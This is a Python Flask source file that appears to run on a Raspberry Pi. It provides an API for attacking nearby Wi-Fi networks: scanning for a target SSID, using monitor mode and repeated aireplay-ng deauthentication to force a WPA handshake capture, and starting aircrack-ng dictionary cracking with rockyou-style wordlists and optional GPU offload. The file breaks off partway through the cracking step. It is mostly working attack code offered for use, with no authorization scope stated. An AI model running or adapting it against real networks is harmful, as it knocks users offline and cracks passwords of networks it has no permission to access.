#!/usr/bin/env python3
"""
Wi-Fi Controller API for Raspberry Pi
- /scan       : list nearby APs
- /start      : start attack workflow against SSID
- /status     : poll running attack status
- /results    : get final result (password / NOT FOUND)
- /files      : list capture/result files
- /cancel     : cancel current attack (best effort)

Assumes:
- Scan iface  : wlan0   (managed)
- Monitor iface: wlan1  (already set to monitor mode)
- Tools: iw, airodump-ng, aircrack-ng present (optional; attack can be fake-simulated)
"""

import os, re, json, time, threading, subprocess, shlex, signal, logging, hashlib
from pathlib import Path
from datetime import datetime, timedelta
from functools import wraps
from flask import Flask, jsonify, request
from flask_cors import CORS

# Load environment variables from config.env file
def load_config_env():
    """Load environment variables from config.env file"""
    config_file = Path(__file__).parent / "config.env"
    if config_file.exists():
        print(f"Loading config from {config_file}")
        with open(config_file) as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#') and '=' in line:
                    key, value = line.split('=', 1)
                    os.environ[key.strip()] = value.strip()
                    print(f"Loaded config: {key.strip()}={value.strip()}")
    else:
        print(f"Config file not found: {config_file}")

# Load config before setting up other variables
load_config_env()

# ---------------- CONFIG ----------------
# Default interfaces - will be auto-detected if not found
DEFAULT_SCAN_IFACE = "wlan0"
DEFAULT_MON_IFACE = "wlan1"
SCAN_IFACE = os.environ.get("SCAN_IFACE", DEFAULT_SCAN_IFACE)
MON_IFACE = os.environ.get("MON_IFACE", DEFAULT_MON_IFACE)
CAP_DIR = Path(os.environ.get("CAP_DIR", "/home/jhye/captures"))
ATTACK_TIMEOUT_SEC = int(os.environ.get("ATTACK_TIMEOUT", "900"))  # 15 min max
API_KEY = os.environ.get("API_KEY", "your-secret-api-key")
WORDLIST_DIR = os.environ.get("WORDLIST_DIR", "/usr/share/wordlists")
RATE_LIMIT_PER_MINUTE = int(os.environ.get("RATE_LIMIT", "200"))  # Allow more requests for polling

# GPU PC Integration Settings
GPU_PC_IP = os.environ.get("GPU_PC_IP", "")
GPU_PC_USER = os.environ.get("GPU_PC_USER", "")
GPU_PC_INCOMING_DIR = os.environ.get("GPU_PC_INCOMING_DIR", "")
SSH_KEY_PATH = os.environ.get("SSH_KEY_PATH", "/home/pi/.ssh/wifi_crack_key")
ENABLE_GPU_OFFLOAD = os.environ.get("ENABLE_GPU_OFFLOAD", "false").lower() == "true"

CAP_DIR.mkdir(parents=True, exist_ok=True)

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('wifi_api.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# --------------- GLOBAL STATE -----------
state_lock = threading.Lock()
attack_state = {
    "running": False,
    "step": "idle",
    "progress": 0,
    "target": "",
    "result": "",
    "start_ts": 0,
    "proc_pids": [],   # pids we spawned
    "last_update": 0,  # timestamp of last progress update
    "sub_progress": 0, # sub-step progress for detailed tracking
    "phase": "idle",   # high-level phase: scan, capture, crack, gpu_cracking, done
    "estimated_time_remaining": 0,
    "current_wordlist": "",
    "handshake_captured": False,
    "networks_found": 0,
    "target_bssid": "",
    "gpu_processing": False,  # true when GPU PC is processing
    "gpu_result": None        # result from GPU PC
}

# Global network storage for pagination
networks_cache = {
    "networks": [],
    "last_scan": 0,
    "scan_lock": threading.Lock()
}

# Rate limiting state
rate_limit_state = {
    "requests": {},  # IP -> list of timestamps
    "lock": threading.Lock()
}

# Interface state
interface_state = {
    "scan_iface": None,
    "mon_iface": None,
    "available_interfaces": [],
    "tools_checked": False,
    "required_tools": ["iw", "airodump-ng", "aircrack-ng"]
}

# -------------- HELPERS -----------------
def detect_interfaces():
    """Auto-detect available wireless interfaces"""
    interfaces = []
    try:
        # First try iw dev (more reliable for wireless)
        rc, out, err = run_cmd("iw dev", timeout=10)
        if rc == 0 and out:
            for line in out.splitlines():
                if "Interface" in line:
                    iface = line.strip().split()[-1]
                    # Verify it's a wireless interface
                    rc2, out2, _ = run_cmd(f"iw dev {iface} info", timeout=5)
                    if rc2 == 0 and "type" in out2.lower():
                        interfaces.append(iface)
                        logger.info(f"Found wireless interface: {iface}")
        
        # Fallback to ip link if iw dev fails
        if not interfaces:
            logger.warning("iw dev failed, trying ip link")
            rc, out, err = run_cmd("ip link show", timeout=10)
            if rc == 0:
                for line in out.splitlines():
                    if "wlan" in line or "wlp" in line:
                        match = re.search(r'\d+: ([^:]+):', line)
                        if match:
                            iface = match.group(1)
                            # Verify interface exists and is wireless
                            if os.path.exists(f"/sys/class/net/{iface}/wireless"):
                                interfaces.append(iface)
                                logger.info(f"Found wireless interface: {iface}")
        
        logger.info(f"Total detected wireless interfaces: {interfaces}")
    except Exception as e:
        logger.error(f"Failed to detect interfaces: {e}")
    return interfaces

def validate_ssid(ssid):
    """Validate SSID input to prevent injection"""
    if not ssid or len(ssid) > 32:
        return False, "SSID must be 1-32 characters"
    # Check for dangerous characters
    if any(char in ssid for char in [';', '&', '|', '`', '$', '(', ')', '\n', '\r']):
        return False, "SSID contains invalid characters"
    return True, "Valid"

def setup_monitor_mode(interface):
    """Set interface to monitor mode"""
    try:
        logger.info(f"Setting {interface} to monitor mode")
        
        # Check if interface exists
        rc_check, _, _ = run_cmd(f"ip link show {interface}", timeout=5)
        if rc_check != 0:
            logger.error(f"Interface {interface} does not exist")
            return False
        
        # Check current mode
        rc_info, out_info, _ = run_cmd(f"iw dev {interface} info", timeout=5)
        if rc_info == 0 and "type monitor" in out_info:
            logger.info(f"Interface {interface} already in monitor mode")
            return True
        
        # Bring interface down
        rc1, out1, err1 = run_cmd(f"sudo ip link set {interface} down", timeout=10)
        if rc1 != 0:
            logger.error(f"Failed to bring interface down: {err1}")
            return False
        
        # Set to monitor mode
        rc2, out2, err2 = run_cmd(f"sudo iw dev {interface} set type monitor", timeout=10)
        if rc2 != 0:
            logger.error(f"Failed to set monitor mode: {err2}")
            return False
        
        # Bring interface up
        rc3, out3, err3 = run_cmd(f"sudo ip link set {interface} up", timeout=10)
        if rc3 != 0:
            logger.error(f"Failed to bring interface up: {err3}")
            return False
        
        # Verify monitor mode was set
        time.sleep(1)
        rc_verify, out_verify, _ = run_cmd(f"iw dev {interface} info", timeout=5)
        if rc_verify == 0 and "type monitor" in out_verify:
            logger.info(f"Successfully set {interface} to monitor mode")
            return True
        else:
            logger.error(f"Monitor mode verification failed for {interface}")
            return False
            
    except Exception as e:
        logger.error(f"Exception setting monitor mode: {e}")
        return False

def setup_managed_mode(interface):
    """Set interface back to managed mode"""
    try:
        logger.info(f"Setting {interface} to managed mode")
        
        # Check if interface exists
        rc_check, _, _ = run_cmd(f"ip link show {interface}", timeout=5)
        if rc_check != 0:
            logger.error(f"Interface {interface} does not exist")
            return False
        
        # Check current mode
        rc_info, out_info, _ = run_cmd(f"iw dev {interface} info", timeout=5)
        if rc_info == 0 and "type managed" in out_info:
            logger.info(f"Interface {interface} already in managed mode")
            return True
        
        # Bring interface down
        rc1, _, err1 = run_cmd(f"sudo ip link set {interface} down", timeout=10)
        if rc1 != 0:
            logger.error(f"Failed to bring interface down: {err1}")
            return False
        
        # Set to managed mode
        rc2, _, err2 = run_cmd(f"sudo iw dev {interface} set type managed", timeout=10)
        if rc2 != 0:
            logger.error(f"Failed to set managed mode: {err2}")
            return False
        
        # Bring interface up
        rc3, _, err3 = run_cmd(f"sudo ip link set {interface} up", timeout=10)
        if rc3 != 0:
            logger.error(f"Failed to bring interface up: {err3}")
            return False
        
        # Verify managed mode was set
        time.sleep(1)
        rc_verify, out_verify, _ = run_cmd(f"iw dev {interface} info", timeout=5)
        if rc_verify == 0 and "type managed" in out_verify:
            logger.info(f"Successfully set {interface} to managed mode")
            return True
        else:
            logger.error(f"Managed mode verification failed for {interface}")
            return False
            
    except Exception as e:
        logger.error(f"Exception setting managed mode: {e}")
        return False

def check_required_tools():
    """Verify aircrack-ng suite is installed"""
    missing_tools = []
    for tool in interface_state["required_tools"]:
        rc, _, _ = run_cmd(f"which {tool}", timeout=5)
        if rc != 0:
            missing_tools.append(tool)
    
    if missing_tools:
        logger.error(f"Missing required tools: {missing_tools}")
        logger.error("Install with: sudo apt install aircrack-ng")
        return False, missing_tools
    else:
        logger.info("All required tools are available")
        return True, []

def get_available_wordlists():
    """Find available wordlists for dictionary attacks"""
    wordlist_paths = [
        "/usr/share/wordlists/rockyou.txt",
        "/usr/share/wordlists/rockyou.txt.gz",
        "/usr/share/wordlists/fasttrack.txt",
        "/usr/share/wordlists/dirb/common.txt",
        "/opt/wordlists/rockyou.txt",
        "/home/pi/wordlists/rockyou.txt",
        f"{WORDLIST_DIR}/rockyou.txt",
        f"{WORDLIST_DIR}/fasttrack.txt"
    ]
    
    available = []
    seen_paths = set()
    for path in wordlist_paths:
        if os.path.exists(path):
            # Get real path to avoid duplicates from symlinks
            real_path = os.path.realpath(path)
            if real_path not in seen_paths:
                seen_paths.add(real_path)
                size = os.path.getsize(path)
                available.append({"path": path, "size": size})
    
    logger.info(f"Found {len(available)} unique wordlists")
    return available

def validate_handshake(cap_file, target_bssid=None):
    """Validate that capture file contains WPA handshake and analyze encryption"""
    try:
        logger.info(f"Analyzing capture file: {cap_file}")
        
        # Use aircrack-ng to check for handshake
        cmd = f"aircrack-ng -q {cap_file}"
        if target_bssid:
            cmd += f" -b {target_bssid}"
        
        rc, out, err = run_cmd(cmd, timeout=15)
        
        # Log full output for debugging
        logger.info(f"Aircrack output: {out}")
        
        # Check for handshake indicators
        handshake_found = False
        if "1 handshake" in out.lower() or "handshake" in out.lower():
            logger.info("✅ Handshake detected in capture file")
            handshake_found = True
        else:
            logger.warning("❌ No handshake detected in capture file")
        
        # Analyze encryption type using tshark if available
        try:
            encryption_info = analyze_encryption_type(cap_file)
            if encryption_info:
                logger.info(f"Encryption analysis: {encryption_info}")
        except:
            pass
        
        # Count packets for debugging
        try:
            packet_count = count_packets_in_capture(cap_file)
            logger.info(f"Packet analysis: {packet_count}")
        except:
            pass
            
        return handshake_found
        
    except Exception as e:
        logger.error(f"Error validating handshake: {e}")
        return False

def analyze_encryption_type(cap_file):
    """Analyze encryption type in capture file"""
    try:
        # Check if tshark is available
        rc_check, _, _ = run_cmd("tshark --version", timeout=5)
        if rc_check != 0:
            return "tshark not available"
        
        # Check for WPA2/WPA3 indicators
        rc, out, _ = run_cmd(f"tshark -r {cap_file} -Y 'wlan.rsn.version' -T fields -e wlan.rsn.version", timeout=10)
        if rc == 0 and out.strip():
            versions = set(out.strip().split('\n'))
            if '1' in versions:
                return "WPA2 detected"
            elif '2' in versions:
                return "WPA3 detected"
        
        # Check for EAPOL frames
        rc, out, _ = run_cmd(f"tshark -r {cap_file} -Y 'eapol' | wc -l", timeout=10)
        if rc == 0 and out.strip():
            eapol_count = int(out.strip()) if out.strip().isdigit() else 0
            if eapol_count > 0:
                return f"EAPOL frames: {eapol_count}"
        
        return "Unknown encryption"
    except Exception as e:
        return f"Analysis failed: {e}"

def count_packets_in_capture(cap_file):
    """Count different packet types in capture"""
    try:
        # Use tcpdump if tshark not available
        rc, out, _ = run_cmd(f"tcpdump -r {cap_file} -c 1000 | wc -l", timeout=10)
        if rc == 0 and out.strip():
            total_packets = out.strip()
            return f"Total packets: {total_packets}"
        
        return "Packet count unavailable"
    except Exception as e:
        return f"Count failed: {e}"

def test_monitor_mode_capability(mon_iface):
    """Test if monitor mode is working properly"""
    logger.info(f"🧪 Testing monitor mode capability for {mon_iface}")
    
    try:
        # 1. Check current mode
        rc, out, err = run_cmd(f"iwconfig {mon_iface}", timeout=5)
        if "Mode:Monitor" not in out:
            logger.warning(f"Interface {mon_iface} not in monitor mode, setting it up...")
            if not setup_monitor_mode(mon_iface):
                logger.error(f"Failed to set {mon_iface} to monitor mode")
                return False
        
        # 2. Set to channel 6 for testing
        logger.info(f"Setting {mon_iface} to channel 6 for testing")
        run_cmd(f"sudo iwconfig {mon_iface} channel 6", timeout=5)
        time.sleep(2)
        
        # 3. Test packet capture for 10 seconds
        logger.info(f"Testing packet capture on {mon_iface} for 10 seconds...")
        test_cap_base = "/tmp/monitor_test"
        
        cmd = f"timeout 10 sudo airodump-ng -w {test_cap_base} --output-format pcap --channel 6 {mon_iface}"
        rc, out, err = run_cmd(cmd, timeout=15)
        
        # 4. Check results
        test_files = [f"{test_cap_base}-01.cap", f"{test_cap_base}.cap"]
        captured_file = None
        
        for test_file in test_files:
            if os.path.exists(test_file):
                captured_file = test_file
                break
        
        if captured_file:
            size = os.path.getsize(captured_file)
            logger.info(f"Monitor test captured {size} bytes")
            
            # Clean up test file
            try:
                os.remove(captured_file)
            except:
                pass
            
            if size > 100:
                logger.info(f"✅ Monitor mode working - captured {size} bytes")
                return True
            else:
                logger.warning(f"⚠️ Monitor mode may not be working - only {size} bytes captured")
                return False
        else:
            logger.error(f"❌ Monitor mode test failed - no capture file created")
            return False
            
    except Exception as e:
        logger.error(f"Monitor mode test failed: {e}")
        return False

def initialize_interfaces():
    """Initialize and detect network interfaces"""
    global interface_state
    
    # Check required tools first
    tools_ok, missing = check_required_tools()
    interface_state["tools_checked"] = tools_ok
    
    if not tools_ok:
        logger.error(f"Missing required tools: {missing}")
        logger.error("Cannot operate without aircrack-ng suite")
        raise Exception(f"Missing required tools: {missing}")
    
    # Check for wordlists
    wordlists = get_available_wordlists()
    interface_state["wordlists"] = wordlists
    if not wordlists:
        logger.warning("No wordlists found - attacks may fail")
    
    # Detect available interfaces
    available = detect_interfaces()
    interface_state["available_interfaces"] = available
    
    if not available:
        logger.error("No wireless interfaces detected")
        raise Exception("No wireless interfaces found")
    
    # Set scan interface
    if SCAN_IFACE in available:
        interface_state["scan_iface"] = SCAN_IFACE
    else:
        interface_state["scan_iface"] = available[0]
        logger.warning(f"Default scan interface {SCAN_IFACE} not found, using {available[0]}")
    
    # Set monitor interface
    if MON_IFACE in available:
        interface_state["mon_iface"] = MON_IFACE
    elif len(available) > 1:
        interface_state["mon_iface"] = available[1]
        logger.warning(f"Default monitor interface {MON_IFACE} not found, using {available[1]}")
    else:
        interface_state["mon_iface"] = available[0]
        logger.warning(f"Using single interface {available[0]} for both scan and monitor")
    
    logger.info(f"Initialized - Scan: {interface_state['scan_iface']}, Monitor: {interface_state['mon_iface']}")
    
    # Test monitor mode capability
    mon_iface = interface_state["mon_iface"]
    logger.info(f"🧪 Testing monitor mode for {mon_iface}...")
    monitor_working = test_monitor_mode_capability(mon_iface)
    interface_state["monitor_tested"] = monitor_working
    
    if monitor_working:
        logger.info(f"✅ Monitor mode test PASSED for {mon_iface}")
    else:
        logger.error(f"❌ Monitor mode test FAILED for {mon_iface}")
        logger.error("This will affect handshake capture capability!")
    
    # Reset to managed mode after testing
    setup_managed_mode(mon_iface)

def check_rate_limit(client_ip):
    """Check if client has exceeded rate limit"""
    with rate_limit_state["lock"]:
        now = datetime.now()
        cutoff = now - timedelta(minutes=1)
        
        # Initialize if not exists
        if client_ip not in rate_limit_state["requests"]:
            rate_limit_state["requests"][client_ip] = []
        
        # Remove old requests
        rate_limit_state["requests"][client_ip] = [
            req_time for req_time in rate_limit_state["requests"][client_ip]
            if req_time > cutoff
        ]
        
        # Check limit
        if len(rate_limit_state["requests"][client_ip]) >= RATE_LIMIT_PER_MINUTE:
            return False
        
        # Add current request
        rate_limit_state["requests"][client_ip].append(now)
        return True

def require_api_key(f):
    """Decorator to require API key authentication"""
    @wraps(f)
    def decorated_function(*args, **kwargs):
        # Check API key
        api_key = request.headers.get('X-API-Key')
        if not api_key or api_key != API_KEY:
            logger.warning(f"Unauthorized access attempt from {request.remote_addr}")
            return jsonify({"error": "Invalid API key"}), 401
        
        # Check rate limit
        if not check_rate_limit(request.remote_addr):
            logger.warning(f"Rate limit exceeded for {request.remote_addr}")
            return jsonify({"error": "Rate limit exceeded"}), 429
        
        return f(*args, **kwargs)
    return decorated_function

def run_cmd(cmd, timeout=30):
    """Run shell command, return (rc, stdout, stderr)."""
    try:
        logger.debug(f"Running command: {cmd}")
        
        # Handle commands with pipes specially
        if "|" in cmd:
            proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        else:
            proc = subprocess.Popen(shlex.split(cmd), stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        
        out, err = proc.communicate(timeout=timeout)
        logger.debug(f"Command result: rc={proc.returncode}, stdout_len={len(out)}, stderr_len={len(err)}")
        
        if proc.returncode != 0 and err:
            logger.warning(f"Command failed: {cmd}, stderr: {err}")
        
        return proc.returncode, out, err
    except subprocess.TimeoutExpired:
        try:
            proc.kill()
            proc.wait(timeout=5)
        except:
            pass
        logger.error(f"Command timeout after {timeout}s: {cmd}")
        return -1, "", "timeout"
    except Exception as e:
        logger.error(f"Command failed: {cmd}, error: {e}")
        return -1, "", str(e)

def parse_iw_scan(text):
    """Parse `iw dev wlan0 scan` output into list of dicts."""
    nets = []
    current = {}
    for line in text.splitlines():
        line = line.strip()
        if line.startswith("BSS "):
            # new cell
            if current.get("ssid"):
                nets.append(current)
            current = {"bssid": line.split()[1], "signal": -100, "encryption": "Open"}
        elif line.startswith("SSID:"):
            ssid = line[5:].strip()
            # Filter out empty SSIDs and hidden networks
            if ssid:
                current["ssid"] = ssid
        elif line.startswith("signal:"):
            try:
                current["signal"] = int(float(line.split()[1]))
            except:
                pass
        elif "WPA" in line or "RSN:" in line:
            current["encryption"] = "WPA/WPA2"
        elif "WEP" in line:
            current["encryption"] = "WEP"
    if current.get("ssid"):
        nets.append(current)
    # Dedup by SSID keep best signal
    best = {}
    for n in nets:
        if n.get("ssid") and (n["ssid"] not in best or n["signal"] > best[n["ssid"]]["signal"]):
            best[n["ssid"]] = n
    return list(best.values())

def get_target_channel(target_bssid, scan_iface):
    """Get the channel for a specific BSSID"""
    try:
        logger.info(f"Finding channel for BSSID: {target_bssid}")
        
        # Use iwlist to scan for specific BSSID
        rc, out, err = run_cmd(f"sudo iwlist {scan_iface} scan | grep -A 20 -B 5 {target_bssid}", timeout=15)
        
        if rc == 0 and out:
            # Look for channel information
            lines = out.split('\n')
            for i, line in enumerate(lines):
                if target_bssid in line:
                    # Look for channel in nearby lines
                    for j in range(max(0, i-5), min(len(lines), i+10)):
                        if 'Channel:' in lines[j] or 'Frequency:' in lines[j]:
                            # Extract channel number
                            import re
                            channel_match = re.search(r'Channel:?(\d+)', lines[j])
                            if channel_match:
                                channel = int(channel_match.group(1))
                                logger.info(f"Found {target_bssid} on channel {channel}")
                                return channel
                            
                            # Extract from frequency
                            freq_match = re.search(r'(\d+\.\d+) GHz', lines[j])
                            if freq_match:
                                freq = float(freq_match.group(1))
                                channel = frequency_to_channel(freq)
                                if channel:
                                    logger.info(f"Found {target_bssid} on channel {channel} (from freq {freq})")
                                    return channel
        
        logger.warning(f"Could not determine channel for {target_bssid}")
        return None
        
    except Exception as e:
        logger.error(f"Error getting target channel: {e}")
        return None

def frequency_to_channel(freq_ghz):
    """Convert frequency to WiFi channel"""
    try:
        # 2.4GHz channels
        if 2.4 <= freq_ghz <= 2.5:
            if freq_ghz == 2.412: return 1
            elif freq_ghz == 2.417: return 2
            elif freq_ghz == 2.422: return 3
            elif freq_ghz == 2.427: return 4
            elif freq_ghz == 2.432: return 5
            elif freq_ghz == 2.437: return 6
            elif freq_ghz == 2.442: return 7
            elif freq_ghz == 2.447: return 8
            elif freq_ghz == 2.452: return 9
            elif freq_ghz == 2.457: return 10
            elif freq_ghz == 2.462: return 11
            else:
                # Calculate for 2.4GHz range
                return int(((freq_ghz - 2.412) * 1000 + 5) // 5) + 1
        
        # 5GHz channels (simplified)
        elif 5.0 <= freq_ghz <= 6.0:
            return int((freq_ghz - 5.0) * 200 + 36)
        
        return None
    except:
        return None

def perform_deauth_attack(target_bssid, mon_iface, duration=10, target_channel=None):
    """Perform deauthentication attack to capture handshake"""
    try:
        logger.info(f"Starting deauth attack on {target_bssid}")
        
        # Set channel if known
        if target_channel:
            logger.info(f"Setting monitor interface to channel {target_channel}")
            run_cmd(f"sudo iwconfig {mon_iface} channel {target_channel}", timeout=5)
        
        # Run aireplay-ng deauth attack with more aggressive settings
        cmd = f"aireplay-ng -0 {duration} -a {target_bssid} {mon_iface}"
        
        logger.info(f"Running deauth command: {cmd}")
        proc = subprocess.Popen(
            shlex.split(cmd),
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            preexec_fn=os.setsid,
            text=True
        )
        
        register_pid(proc.pid)
        
        # Monitor output for debugging
        try:
            stdout, stderr = proc.communicate(timeout=duration + 5)
            if stdout:
                logger.info(f"Deauth stdout: {stdout}")
            if stderr:
                logger.warning(f"Deauth stderr: {stderr}")
        except subprocess.TimeoutExpired:
            logger.warning("Deauth command timed out")
            try:
                os.killpg(proc.pid, signal.SIGTERM)
            except:
                pass
            
        logger.info("Deauth attack completed")
        return True
        
    except Exception as e:
        logger.error(f"Deauth attack failed: {e}")
        return False

def kill_process_tree(pids):
    """Kill process tree for given PIDs"""
    for pid in pids:
        try:
            logger.info(f"Killing process group {pid}")
            os.killpg(pid, signal.SIGKILL)
        except Exception as e:
            logger.warning(f"Failed to kill process {pid}: {e}")

# ------------- ATTACK WORKER ------------
def attack_worker(target_ssid):
    """Main attack worker thread"""
    with state_lock:
        attack_state.update({
            "running": True,
            "step": "Preparing",
            "progress": 0,
            "target": target_ssid,
            "result": "",
            "start_ts": time.time(),
            "proc_pids": [],
            "last_update": time.time(),
            "sub_progress": 0,
            "phase": "preparing",
            "estimated_time_remaining": ATTACK_TIMEOUT_SEC,
            "current_wordlist": "",
            "handshake_captured": False,
            "networks_found": 0,
            "target_bssid": ""
        })

    try:
        # Check if monitor interface is available
        mon_iface = interface_state.get("mon_iface", MON_IFACE)
        if not interface_state.get("tools_checked"):
            step_update("Error: Required tools not available", 0)
            raise Exception("Required tools (aircrack-ng suite) not installed")
        
        # Get target network details from recent scan
        target_bssid = None
        scan_iface = interface_state.get("scan_iface", SCAN_IFACE)
        
        step_update("Finding target network", 5, "scanning")
        
        # First ensure scan interface is in managed mode
        if not setup_managed_mode(scan_iface):
            raise Exception(f"Failed to set scan interface {scan_iface} to managed mode")
        
        # Perform a fresh scan to find target
        logger.info(f"Performing fresh scan to locate target: {target_ssid}")
        step_update("Scanning for networks", 8, "scanning", 50)
        
        # Wait a moment to avoid device busy
        time.sleep(2)
        
        # Try scan with retry on device busy
        for attempt in range(3):
            rc, scan_out, err = run_cmd(f"sudo iw dev {scan_iface} scan", timeout=30)
            if rc == 0:
                break
            elif "Device or resource busy" in err:
                logger.warning(f"Scan attempt {attempt + 1} failed - device busy, retrying...")
                time.sleep(5)  # Wait longer between retries
                continue
            else:
                logger.error(f"Target scan failed: {err}")
                break
        
        step_update("Processing scan results", 10, "scanning", 100)
        
        if rc != 0:
            logger.warning("Direct scan failed, trying fallback method")
            # Use cached network data as fallback
            target_bssid = None
        
        if rc == 0 and scan_out:
            # Extract BSSID from scan output - look for the target SSID
            lines = scan_out.splitlines()
            current_bssid = None
            
            for i, line in enumerate(lines):
                if line.strip().startswith("BSS "):
                    # Extract just the MAC address, remove any extra characters
                    bssid_part = line.split()[1]
                    # Use regex to extract only valid MAC address format
                    import re
                    mac_match = re.search(r'([0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2})', bssid_part)
                    current_bssid = mac_match.group(1) if mac_match else None
                elif line.strip().startswith("SSID:") and target_ssid in line:
                    if current_bssid:
                        target_bssid = current_bssid
                        logger.info(f"Found target BSSID: {target_bssid} for SSID: {target_ssid}")
                        step_update("Target network located", 15, "scanning", 100, 
                                  {"target_bssid": target_bssid})
                        break
        
        if not target_bssid:
            logger.warning(f"Could not find BSSID for target SSID: {target_ssid}")
            logger.info("Proceeding with attack without specific BSSID targeting")
        
        # Step 1: capture handshake
        step_update("Initializing handshake capture", 20, "capture")
        cap_basename = f"{sanitize(target_ssid)}-{int(time.time())}"
        cap_file_base = CAP_DIR / cap_basename

        # Ensure monitor mode is set
        if not setup_monitor_mode(mon_iface):
            raise Exception(f"Failed to set {mon_iface} to monitor mode")
        
        # Ensure capture directory exists and is writable
        CAP_DIR.mkdir(parents=True, exist_ok=True)
        if not os.access(CAP_DIR, os.W_OK):
            raise Exception(f"Capture directory {CAP_DIR} is not writable")
        
        # Start airodump-ng capture
        logger.info(f"Starting handshake capture on {mon_iface}")
        logger.info(f"Capture file base: {cap_file_base}")
        
        # Get target channel first
        target_channel = None
        if target_bssid:
            target_channel = get_target_channel(target_bssid, scan_iface)
            logger.info(f"Target channel for {target_bssid}: {target_channel}")
        
        # Use channel-specific capture for better results
        airodump_cmd = ["sudo", "airodump-ng", 
                       "-w", str(cap_file_base), 
                       "--output-format", "pcap", 
                       "--write-interval", "1"]
        
        # Focus on target channel if found, otherwise scan all
        if target_channel:
            airodump_cmd.extend(["--channel", str(target_channel)])
            logger.info(f"Focusing on channel {target_channel}")
        else:
            airodump_cmd.extend(["--channel", "1,6,11"])  # Most common channels
            logger.info("Scanning common channels: 1,6,11")
        
        if target_bssid:
            airodump_cmd.extend(["--bssid", target_bssid])
        
        airodump_cmd.append(mon_iface)
        
        # Verify monitor mode before starting
        rc_verify, out_verify, _ = run_cmd(f"iwconfig {mon_iface}", timeout=5)
        if "Mode:Monitor" not in out_verify:
            logger.error(f"Interface {mon_iface} not in monitor mode!")
            raise Exception(f"Monitor mode verification failed for {mon_iface}")
        else:
            logger.info(f"Monitor mode verified for {mon_iface}")
        
        logger.info(f"Running airodump command: {' '.join(airodump_cmd)}")
        
        p = subprocess.Popen(
            airodump_cmd,
            preexec_fn=os.setsid,
            stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
        )
        register_pid(p.pid)
        
        # Wait longer for airodump to start and capture some packets
        step_update("Starting packet capture", 25, "capture", 25)
        time.sleep(15)  # Increased from 10s to 15s for better initialization
        
        # Perform deauth attack if we have target BSSID
        if target_bssid:
            step_update("Forcing handshake capture", 30, "capture", 50)
            # Multiple deauth rounds for better success
            for round_num in range(3):
                logger.info(f"Deauth round {round_num + 1}/3")
                perform_deauth_attack(target_bssid, mon_iface, duration=10, target_channel=target_channel)
                time.sleep(5)  # Wait between rounds
            step_update("Deauth attack completed", 35, "capture", 75)
        else:
            step_update("Passive handshake capture", 30, "capture", 50)
            time.sleep(45)  # Increased from 30s to 45s for passive capture
            step_update("Passive capture completed", 35, "capture", 75)
        
        # Additional capture time after deauth
        step_update("Finalizing capture", 37, "capture", 85)
        time.sleep(10)  # Extra time to ensure handshake is captured
        
        # Stop airodump
        try:
            os.killpg(p.pid, signal.SIGINT)
        except:
            pass
        
        # Wait for process to finish and get output
        try:
            stdout, stderr = p.communicate(timeout=5)
            if stderr:
                logger.warning(f"Airodump stderr: {stderr}")
        except:
            pass
        
        time.sleep(2)

        # Validate handshake capture - check multiple possible file extensions
        step_update("Validating handshake", 40, "capture", 90)
        
        # airodump-ng can create files with different suffixes
        possible_files = [
            Path(str(cap_file_base) + ".cap"),
            Path(str(cap_file_base) + ".pcap"),
            Path(str(cap_file_base) + "-01.cap"),
            Path(str(cap_file_base) + "-01.pcap")
        ]
        
        cap_pcap_file = None
        for possible_file in possible_files:
            if possible_file.exists():
                cap_pcap_file = possible_file
                logger.info(f"Found capture file: {cap_pcap_file}")
                break
        
        if not cap_pcap_file:
            # List files in capture directory for debugging
            files_in_dir = list(CAP_DIR.glob(f"{cap_basename}*"))
            logger.error(f"No capture file found. Files in {CAP_DIR}: {files_in_dir}")
            raise Exception(f"Capture file not created. Expected files: {[str(f) for f in possible_files]}")
        
        # Validate file size first
        file_size = cap_pcap_file.stat().st_size
        logger.info(f"Capture file size: {file_size} bytes")
        
        if file_size < 1000:  # Very small file likely means no data
            logger.error(f"Capture file is too small ({file_size} bytes) - likely failed capture")
            # Don't fail immediately, but log the issue
        elif file_size < 50000:  # Less than 50KB might be insufficient
            logger.warning(f"Capture file is small ({file_size} bytes) - may not contain handshake")
        else:
            logger.info(f"Capture file size looks good ({file_size} bytes)")
        
        handshake_valid = validate_handshake(cap_pcap_file, target_bssid)
        step_update("Handshake validation complete", 45, "capture", 100, 
                   {"handshake_captured": handshake_valid})
        
        if not handshake_valid:
            logger.warning("No handshake detected, but continuing with dictionary attack")
            # Don't fail here - sometimes we can still crack without perfect handshake detection
        
        # Step 2: Dictionary attack - Use GPU PC if available
        step_update("Preparing dictionary attack", 50, "cracking")
        pwd = "NOT FOUND"
        
        # Check if GPU offload is enabled and configured
        logger.info(f"GPU offload enabled: {ENABLE_GPU_OFFLOAD}, GPU PC IP: {GPU_PC_IP}")
        
        if ENABLE_GPU_OFFLOAD and GPU_PC_IP:
            # Transfer to GPU PC for processing
            step_update("Preparing for GPU PC", 55, "gpu_ready", 25)
            logger.info(f"Starting GPU transfer for {cap_pcap_file}")
            
            if transfer_cap_to_gpu_pc_http(cap_pcap_file):
                step_update("Ready for GPU - Manual copy needed", 60, "gpu_ready", 50, 
                           {"gpu_processing": True})
                logger.info("File prepared for GPU processing - waiting for manual transfer")
                
                # Wait for GPU result (longer timeout for manual process)
                pwd = wait_for_gpu_result(target_ssid, timeout=min(ATTACK_TIMEOUT_SEC, 1200))
                
                if pwd != "NOT FOUND":
                    step_update(f"GPU cracked: {pwd}", 95, "complete", 100)
                else:
                    step_update("GPU timeout - using Pi", 70, "cracking")
                    logger.warning("GPU processing timed out, falling back to Pi")
            else:
                step_update("GPU prep failed, using Pi", 55, "cracking")
                logger.error("GPU file preparation failed")
        else:
            logger.info("GPU offload disabled or not configured, using Pi processing")
        
        # Fallback to Pi processing if GPU failed or disabled
        if pwd == "NOT FOUND":
            # Get available wordlists
            wordlists = interface_state.get("wordlists", [])
            if not wordlists:
                logger.error("No wordlists available for attack")
